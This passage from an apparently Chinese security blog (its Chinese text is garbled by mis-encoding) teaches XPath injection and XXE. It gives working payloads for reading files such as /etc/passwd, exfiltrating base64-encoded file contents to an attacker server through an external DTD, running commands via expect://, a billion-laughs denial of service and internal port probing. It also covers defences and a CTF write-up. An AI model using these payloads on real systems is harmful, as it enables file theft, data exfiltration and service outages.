class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$xml</span><span class="token operator">=</span><span class="token function">simplexml_load_file</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'index.xml'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$name</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$pwd</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'pwd'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$query</span><span class="token operator">=</span><span class="token string double-quoted-string">"/root/users/user[username/text()='"</span><span class="token operator">.</span><span class="token variable">$name</span><span class="token operator">.</span><span class="token string double-quoted-string">"' and password/text()='"</span><span class="token operator">.</span><span class="token variable">$pwd</span><span class="token operator">.</span><span class="token string double-quoted-string">"']"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$query</span><span class="token punctuation">;</span><span class="token variable">$result</span><span class="token operator">=</span><span class="token variable">$xml</span><span class="token operator">-></span><span class="token function">xpath</span><span class="token punctuation">(</span><span class="token variable">$query</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;h2>Welcome&lt;/h2>'</span><span class="token punctuation">;</span>    <span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$result</span> <span class="token keyword">as</span> <span class="token variable">$key</span><span class="token operator">=></span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;br />ID:'</span><span class="token operator">.</span><span class="token variable">$value</span><span class="token operator">-></span><span class="token property">id</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;br />Username:'</span><span class="token operator">.</span><span class="token variable">$value</span><span class="token operator">-></span><span class="token property">username</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span></code></pre><h4 id="ç›´æ¥æ³¨å…¥"><a href="#ç›´æ¥æ³¨å…¥" class="headerlink" title="ç›´æ¥æ³¨å…¥"></a>ç›´æ¥æ³¨å…¥</h4><p><strong>payload</strong></p><p><code>?name=&#39; or 1=1 or &#39;&#39;=&#39;&amp;pwd=1</code>ï¼Œç»“æœå¦‚ä¸‹ï¼Œç±»ä¼¼sqlæ³¨å…¥ï¼Œç»•è¿‡äº†xmlæŸ¥è¯¢</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/XXE%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200811093843233.png" alt loading="lazy"></p><h4 id="ç›²æ³¨"><a href="#ç›²æ³¨" class="headerlink" title="ç›²æ³¨"></a>ç›²æ³¨</h4><p><strong>payload</strong></p><p>æœ‰è¿”å›ç»“æœåˆ™ä¸ºæ­£ç¡®</p><pre class="language-xml" data-language="xml"><code class="language-xml">æ¨æµ‹æ ¹èŠ‚ç‚¹æ•°ï¼Œæœ‰è¿”å›ç»“æœåˆ™è¯´æ˜åªæœ‰ä¸€ä¸ªæ ¹èŠ‚ç‚¹' or count(/*) = 1 or '1' = '2  çŒœè§£ä¸€çº§èŠ‚ç‚¹' or substring(name(/*[position() = 1]),1,1)='r' or '1'='2  ' or substring(name(/*[position() = 1]),1,1)='o' or '1'='2  ......æ¨æµ‹rootçš„ä¸‹ä¸€çº§èŠ‚ç‚¹æ•°' or count(/root/*) = 1 or '1' = '2çŒœè§£rootçš„ä¸‹ä¸€çº§èŠ‚ç‚¹' or substring(name(/root/*[position() = 1]),1,1)='u' or '1'='2' or substring(name(/root/*[position() = 1]),1,1)='s' or '1'='2......çŒœè§£èŠ‚ç‚¹ä¸­çš„æ•°æ®' or /root/users/user[1]/username[contains(text(),'r')] or '1'='2  ' or /root/users/user[1]/username[contains(text(),'ro')] or '1'='2  ......</code></pre><ul><li><code>/ ï¼š</code>ä»æ ¹èŠ‚ç‚¹é€‰å–</li><li><code>// ï¼š</code>ä»åŒ¹é…é€‰æ‹©çš„å½“å‰èŠ‚ç‚¹é€‰æ‹©æ–‡æ¡£ä¸­çš„èŠ‚ç‚¹ï¼Œè€Œä¸è€ƒè™‘å®ƒä»¬çš„ä½ç½®</li><li><code>. ï¼š</code>é€‰å–å½“å‰èŠ‚ç‚¹</li><li><code>.. ï¼š</code>é€‰å–å½“å‰èŠ‚ç‚¹çš„çˆ¶èŠ‚ç‚¹</li></ul><h3 id="XMLå¤–éƒ¨å®ä½“æ³¨å…¥-XXE"><a href="#XMLå¤–éƒ¨å®ä½“æ³¨å…¥-XXE" class="headerlink" title="XMLå¤–éƒ¨å®ä½“æ³¨å…¥(XXE)"></a>XMLå¤–éƒ¨å®ä½“æ³¨å…¥(XXE)</h3><blockquote><p>XXEæ¼æ´å‘ç”Ÿåœ¨åº”ç”¨ç¨‹åºè§£æXMLè¾“å…¥æ—¶ï¼Œæ²¡æœ‰ç¦æ­¢å¤–éƒ¨å®ä½“çš„åŠ è½½ï¼Œå¯¼è‡´å¯åŠ è½½æ¶æ„å¤–éƒ¨æ–‡ä»¶å’Œä»£ç ï¼Œé€ æˆ<strong>ä»»æ„æ–‡ä»¶è¯»å–ã€å‘½ä»¤æ‰§è¡Œã€å†…ç½‘ç«¯å£æ‰«æã€æ”»å‡»å†…ç½‘ç½‘ç«™ã€å‘èµ·Dosæ”»å‡»</strong>ç­‰å±å®³ã€‚</p><p>XXEæ¼æ´è§¦å‘çš„ç‚¹å¾€å¾€æ˜¯å¯ä»¥ä¸Šä¼ xmlæ–‡ä»¶çš„ä½ç½®ï¼Œæ²¡æœ‰å¯¹ä¸Šä¼ çš„xmlæ–‡ä»¶è¿›è¡Œè¿‡æ»¤ï¼Œå¯¼è‡´å¯ä¸Šä¼ æ¶æ„xmlæ–‡ä»¶ã€‚</p></blockquote><blockquote><p>XXEçš„é€ æˆä¸PHPç‰ˆæœ¬æ— å…³ï¼Œä¸libxmlåº“çš„ç‰ˆæœ¬æœ‰å…³ã€‚libxml &lt;= 2.9.0ä¸­ï¼Œé»˜è®¤å¯ç”¨äº†å¤–éƒ¨å®ä½“ï¼Œlibxml&gt;2.9.0ä¸­é»˜è®¤ä»…ç”¨äº†å¤–éƒ¨å®ä½“ã€‚XXEå¹¶ä¸æ˜¯ç›´æ¥ç”±libxmlåº“é€ æˆçš„ï¼Œlibxmlåº“æä¾›äº†ä¸€äº›XMLæ ¸å¿ƒåŠŸèƒ½ï¼ŒåŒ…æ‹¬ç¦ç”¨å¤–éƒ¨å®ä½“çš„libxml_disable_entity_loader()å‡½æ•°ï¼ŒSimpleXMLåº“æä¾›äº†è§£æXMLçš„å‡½æ•°ï¼ŒSimpleXMLåº“ä¾èµ–äºlibxmlåº“ã€‚</p></blockquote><p>æœ¬åœ°æµ‹è¯•ç¯å¢ƒphp.4.45   libxml = 2.7.8</p><p>å¤–éƒ¨å®ä½“å¯æ”¯æŒhttpã€fileç­‰åè®®ã€‚ä¸åŒç¨‹åºæ”¯æŒçš„åè®®ä¸åŒ</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/XXE%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200811110816675.png" alt loading="lazy"></p><h4 id="è¯»å–ä»»æ„æ–‡ä»¶"><a href="#è¯»å–ä»»æ„æ–‡ä»¶" class="headerlink" title="è¯»å–ä»»æ„æ–‡ä»¶"></a>è¯»å–ä»»æ„æ–‡ä»¶</h4><h5 id="æœ‰å›æ˜¾"><a href="#æœ‰å›æ˜¾" class="headerlink" title="æœ‰å›æ˜¾"></a>æœ‰å›æ˜¾</h5><p><strong>xxe.php</strong></p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$xml</span> <span class="token operator">=</span> <span class="token function">simplexml_load_string</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'xml'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">print_r</span><span class="token punctuation">(</span><span class="token variable">$xml</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span></code></pre><p><strong>payload</strong></p><pre class="language-xml" data-language="xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0" encoding="utf-8"?></span><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">xxe</span> <span class="token punctuation">[</span><span class="token internal-subset"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ELEMENT</span> <span class="token attr-name">name</span> <span class="token attr-name">ANY</span> <span class="token punctuation">></span></span>&lt;!ENTITY file SYSTEM "file:///d://flag.txt" ></span><span class="token punctuation">]</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>root</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>name</span><span class="token punctuation">></span></span><span class="token entity named-entity" title="&file;">&amp;file;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>name</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>root</span><span class="token punctuation">></span></span></code></pre><p>urlç¼–ç åç»™ä¼ å…¥ï¼Œå³åœ¨ xml ä¸­ <code>&amp;file ;</code> å˜æˆäº†å¤–éƒ¨æ–‡ä»¶<code>qwzf.txt</code>ä¸­å†…å®¹ï¼Œå¯¼è‡´æ•æ„Ÿä¿¡æ¯æ³„éœ²ã€‚</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/XXE%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200811102323743.png" alt loading="lazy"></p><h5 id="æ— å›æ˜¾"><a href="#æ— å›æ˜¾" class="headerlink" title="æ— å›æ˜¾"></a>æ— å›æ˜¾</h5><p><strong>xxe.php</strong></p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$xml</span> <span class="token operator">=</span> <span class="token function">simplexml_load_string</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'xml'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// print_r($xml);</span><span class="token delimiter important">?></span></span></code></pre><p>è¿™ç§æƒ…å†µå°±éœ€è¦å°†æ•°æ®å‘é€åˆ°è¿œç¨‹æœåŠ¡å™¨(æ”»å‡»æœåŠ¡å™¨)</p><p><strong>payload</strong></p><p><strong>ä¼ å…¥çš„xml</strong>    ä¸¤ç§æ–¹å¼</p><pre class="language-xml" data-language="xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0" encoding="utf-8" ?></span><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">test</span><span class="token punctuation">[</span><span class="token internal-subset">&lt;!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=D:/flag.txt">&lt;!ENTITY % dtd SYSTEM "http://172.18.104.218/xxe.dtd">%dtd;%send;</span><span class="token punctuation">]</span><span class="token punctuation">></span></span>å¦ä¸€ç§æ–¹å¼<span class="token prolog">&lt;?xml version="1.0" encoding="utf-8" ?></span><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">root</span><span class="token punctuation">[</span><span class="token internal-subset">&lt;!ENTITY % dtd SYSTEM "http://172.18.104.218/xxe.dtd">%dtd;</span><span class="token punctuation">]</span><span class="token punctuation">></span></span></code></pre><p><strong>è¿œç¨‹æœåŠ¡å™¨çš„xxe.dtdæ–‡ä»¶</strong>    ä¸¤ç§æ–¹å¼</p><pre class="language-xml" data-language="xml"><code class="language-xml">&lt;!ENTITY % payload "&lt;!ENTITY <span class="token entity" title="&#37;">&amp;#37;</span> send SYSTEM 'http://172.18.104.218/?content=%file;'>">%payload;å¦ä¸€ç§æ–¹å¼ï¼š&lt;!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=D:/flag.txt">&lt;!ENTITY % int "&lt;!ENTITY <span class="token entity" title="&#37;">&amp;#37;</span> send SYSTEM 'http://172.18.104.218:5000/?content=%file;'>">%int;%send;</code></pre><p>å°†xmlè¿›è¡Œurlç¼–ç åä¼ å…¥</p><p>å†æŸ¥çœ‹è¿œç¨‹æœåŠ¡å™¨çš„apacheæ—¥å¿—æ–‡ä»¶</p><p><code>cat /var/log/apache2/access.log</code></p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/XXE%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200811104737190.png" alt loading="lazy"></p><p><code>nc -lvp 5000</code>  ç«¯å£ç›‘å¬</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/XXE%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200811111337248.png" alt loading="lazy"></p><p>è§£ç åå³æ˜¯æ–‡ä»¶çš„å†…å®¹</p><p>æ”»å‡»æµç¨‹</p><ul><li>å…ˆè°ƒç”¨<code>%dtd</code>ï¼Œè¯·æ±‚è¿œç¨‹æœåŠ¡å™¨(æ”»å‡»æœåŠ¡å™¨)ä¸Šçš„<code>evil.dtd</code>ã€‚</li><li>å†è°ƒç”¨ <code>evil.dtd</code>ä¸­çš„ <code>%file</code>ã€‚<code>%file</code> è·å–å—æ”»å‡»çš„æœåŠ¡å™¨ä¸Šé¢çš„æ•æ„Ÿæ–‡ä»¶ï¼Œç„¶åå°† <code>%file</code> çš„è¿”å›ç»“æœä¼ åˆ°<code>%send</code> ã€‚</li><li>ç„¶åè°ƒç”¨ <code>%send;</code> æŠŠè¯»å–åˆ°çš„æ•°æ®å‘é€åˆ°è¿œç¨‹æœåŠ¡å™¨ä¸Šã€‚</li></ul><h4 id="ç³»ç»Ÿå‘½ä»¤æ‰§è¡Œ"><a href="#ç³»ç»Ÿå‘½ä»¤æ‰§è¡Œ" class="headerlink" title="ç³»ç»Ÿå‘½ä»¤æ‰§è¡Œ"></a>ç³»ç»Ÿå‘½ä»¤æ‰§è¡Œ</h4><p>åœ¨å®‰è£…expectæ‰©å±•çš„PHPç¯å¢ƒé‡Œæ‰§è¡Œç³»ç»Ÿå‘½ä»¤ï¼Œå…¶ä»–åè®®ä¹Ÿæœ‰å¯èƒ½å¯ä»¥æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ã€‚</p><pre class="language-xml" data-language="xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0" encoding="utf-8"?></span><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">xxe</span> <span class="token punctuation">[</span><span class="token internal-subset"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ELEMENT</span> <span class="token attr-name">name</span> <span class="token attr-name">ANY</span> <span class="token punctuation">></span></span>&lt;!ENTITY xxe SYSTEM "expect://id" ></span><span class="token punctuation">]</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>root</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>name</span><span class="token punctuation">></span></span><span class="token entity named-entity" title="&xxe;">&amp;xxe;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>name</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>root</span><span class="token punctuation">></span></span></code></pre><p>é€šè¿‡XXEå¯ä»¥å®ç°RCEçš„å®ä¾‹å¾ˆå°‘ã€‚</p><h4 id="æ‹’ç»æœåŠ¡æ”»å‡»-Dos"><a href="#æ‹’ç»æœåŠ¡æ”»å‡»-Dos" class="headerlink" title="æ‹’ç»æœåŠ¡æ”»å‡»(Dos)"></a>æ‹’ç»æœåŠ¡æ”»å‡»(Dos)</h4><pre class="language-xml" data-language="xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0"?></span>   <span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">lolz</span> <span class="token punctuation">[</span><span class="token internal-subset"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ENTITY</span> <span class="token attr-name">lol</span> <span class="token attr-name">"lol"</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ENTITY</span> <span class="token attr-name">lol2</span> <span class="token attr-name">"&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;"</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ENTITY</span> <span class="token attr-name">lol3</span> <span class="token attr-name">"&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;"</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ENTITY</span> <span class="token attr-name">lol4</span> <span class="token attr-name">"&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;"</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ENTITY</span> <span class="token attr-name">lol5</span> <span class="token attr-name">"&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;"</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ENTITY</span> <span class="token attr-name">lol6</span> <span class="token attr-name">"&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;"</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ENTITY</span> <span class="token attr-name">lol7</span> <span class="token attr-name">"&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;"</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ENTITY</span> <span class="token attr-name">lol8</span> <span class="token attr-name">"&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;"</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ENTITY</span> <span class="token attr-name">lol9</span> <span class="token attr-name">"&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;"</span><span class="token punctuation">></span></span></span><span class="token punctuation">]</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>lolz</span><span class="token punctuation">></span></span><span class="token entity named-entity" title="&lol9;">&amp;lol9;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>lolz</span><span class="token punctuation">></span></span></code></pre><p><strong>åŸç†</strong>ï¼šé€’å½’å¼•ç”¨,lol å®ä½“å…·ä½“è¿˜æœ‰ â€œlolâ€ å­—ç¬¦ä¸²ï¼Œç„¶åä¸€ä¸ª lol2 å®ä½“å¼•ç”¨äº† 10 æ¬¡ lol å®ä½“ï¼Œä¸€ä¸ª lol3 å®ä½“å¼•ç”¨äº† 10 æ¬¡ lol2 å®ä½“ï¼Œæ­¤æ—¶ä¸€ä¸ª lol3 å®ä½“å°±å«æœ‰ 10^2 ä¸ª â€œlolâ€ äº†ï¼Œä»¥æ­¤ç±»æ¨ï¼Œlol9 å®ä½“å«æœ‰ 10^8 ä¸ª â€œlolâ€ å­—ç¬¦ä¸²,æœ€åå†å¼•ç”¨lol9ã€‚</p><h4 id="æ¢æµ‹å†…ç½‘ç«¯å£"><a href="#æ¢æµ‹å†…ç½‘ç«¯å£" class="headerlink" title="æ¢æµ‹å†…ç½‘ç«¯å£"></a>æ¢æµ‹å†…ç½‘ç«¯å£</h4><pre class="language-xml" data-language="xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0" encoding="utf-8"?></span><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">xxe</span> <span class="token punctuation">[</span><span class="token internal-subset"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ELEMENT</span> <span class="token attr-name">name</span> <span class="token attr-name">ANY</span> <span class="token punctuation">></span></span>&lt;!ENTITY xxe SYSTEM "http://127.0.0.1:80" ></span><span class="token punctuation">]</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>root</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>name</span><span class="token punctuation">></span></span><span class="token entity named-entity" title="&xxe;">&amp;xxe;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>name</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>root</span><span class="token punctuation">></span></span></code></pre><h3 id="æ¼æ´é˜²å¾¡"><a href="#æ¼æ´é˜²å¾¡" class="headerlink" title="æ¼æ´é˜²å¾¡"></a>æ¼æ´é˜²å¾¡</h3><p><strong>ä½¿ç”¨å¼€å‘è¯­è¨€æä¾›çš„ç¦ç”¨å¤–éƒ¨å®ä½“çš„æ–¹æ³•</strong></p><p>php:</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token function">libxml_disable_entity_loader</span><span class="token punctuation">(</span><span class="token constant boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>java:</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name">DocumentBuilderFactory</span> dbf <span class="token operator">=</span><span class="token class-name">DocumentBuilderFactory</span><span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>dbf<span class="token punctuation">.</span><span class="token function">setExpandEntityReferences</span><span class="token punctuation">(</span><span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>Python:</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> lxml <span class="token keyword">import</span> etreexmlData <span class="token operator">=</span> etree<span class="token punctuation">.</span>parse<span class="token punctuation">(</span>xmlSource<span class="token punctuation">,</span>etree<span class="token punctuation">.</span>XMLParser<span class="token punctuation">(</span>resolve_entities<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><p><strong>è¿‡æ»¤ç”¨æˆ·æäº¤çš„XMLæ•°æ®</strong></p><p>è¿‡æ»¤å…³é”®å­—ï¼š<code>&lt;\!DOCTYPE</code>å’Œ<code>&lt;\!ENTITY</code>ï¼Œæˆ–è€…<code>SYSTEM</code>å’Œ<code>PUBLIC</code>ã€‚</p><p><strong>ä¸å…è®¸XMLä¸­å«æœ‰è‡ªå·±å®šä¹‰çš„DTD</strong></p><h3 id="æ —å­"><a href="#æ —å­" class="headerlink" title="æ —å­"></a>æ —å­</h3><h4 id="NCTF2019-True-XML-cookbook"><a href="#NCTF2019-True-XML-cookbook" class="headerlink" title="[NCTF2019]True XML cookbook"></a>[NCTF2019]True XML cookbook</h4><p>ç•Œé¢ï¼š</p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/XXEå­¦ä¹ ç¬”è®°/image-20200817204320669.png" style="zoom:80%;" loading="lazy"><p>é¢˜ç›®æç¤º<code>xml</code>ï¼Œæ¨æµ‹æ˜¯<code>xxe</code>ï¼Œäºæ˜¯<code>login</code>æŠ“åŒ…ï¼Œå‘ç°æäº¤<code>username</code>å’Œ<code>password</code>æ˜¯ä»¥ä¸€ä¸ª<code>xml</code>æ ¼å¼çš„æ•°æ®æäº¤çš„ï¼Œå¦‚ä¸‹ï¼š</p><pre class="language-xml" data-language="xml"><code class="language-xml"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>user</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>username</span><span class="token punctuation">></span></span>admin<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>username</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>password</span><span class="token punctuation">></span></span>123456<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>password</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>user</span><span class="token punctuation">></span></span></code></pre><p>äºæ˜¯è¿›è¡Œ<code>xxe</code>æ³¨å…¥æµ‹è¯•ï¼š</p><pre class="language-xml" data-language="xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0" encoding="utf-8"?></span><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">xxe</span> <span class="token punctuation">[</span><span class="token internal-subset"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ELEMENT</span> <span class="token attr-name">name</span> <span class="token attr-name">ANY</span> <span class="token punctuation">></span></span>&lt;!ENTITY file SYSTEM "file:///etc/passwd" ></span><span class="token punctuation">]</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>user</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>username</span><span class="token punctuation">></span></span><span class="token entity named-entity" title="&file;">&amp;file;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>username</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>password</span><span class="token punctuation">></span></span>aaa<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>password</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>user</span><span class="token punctuation">></span></span></code></pre><p>å›æ˜¾<code>/etc/passwd</code>çš„å†…å®¹ï¼Œå­˜åœ¨<code>xxe</code>æ³¨å…¥ï¼Œå°è¯•è¯»å–æ–‡ä»¶ï¼Œå¾—åˆ°<code>doLogin.php</code>çš„ä»£ç </p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">/*** autor: c0ny1* date: 2018-2-7*/</span><span class="token variable">$USERNAME</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'admin'</span><span class="token punctuation">;</span> <span class="token comment">//è´¦å·</span><span class="token variable">$PASSWORD</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'024b87931a03f738fff6693ce0a78c88'</span><span class="token punctuation">;</span> <span class="token comment">//å¯†ç </span><span class="token variable">$result</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">;</span><span class="token function">libxml_disable_entity_loader</span><span class="token punctuation">(</span><span class="token constant boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$xmlfile</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'php://input'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">try</span><span class="token punctuation">&#123;</span><span class="token variable">$dom</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">DOMDocument</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$dom</span><span class="token operator">-></span><span class="token function">loadXML</span><span class="token punctuation">(</span><span class="token variable">$xmlfile</span><span class="token punctuation">,</span> <span class="token class-name">LIBXML_NOENT</span> <span class="token operator">|</span> <span class="token class-name">LIBXML_DTDLOAD</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$creds</span> <span class="token operator">=</span> <span class="token function">simplexml_import_dom</span><span class="token punctuation">(</span><span class="token variable">$dom</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$username</span> <span class="token operator">=</span> <span class="token variable">$creds</span><span class="token operator">-></span><span class="token property">username</span><span class="token punctuation">;</span><span class="token variable">$password</span> <span class="token operator">=</span> <span class="token variable">$creds</span><span class="token operator">-></span><span class="token property">password</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$username</span> <span class="token operator">==</span> <span class="token variable">$USERNAME</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$password</span> <span class="token operator">==</span> <span class="token variable">$PASSWORD</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">sprintf</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"&lt;result>&lt;code>%d&lt;/code>&lt;msg>%s&lt;/msg>&lt;/result>"</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token variable">$username</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span><span class="token variable">$result</span> <span class="token operator">=</span> <span class="token 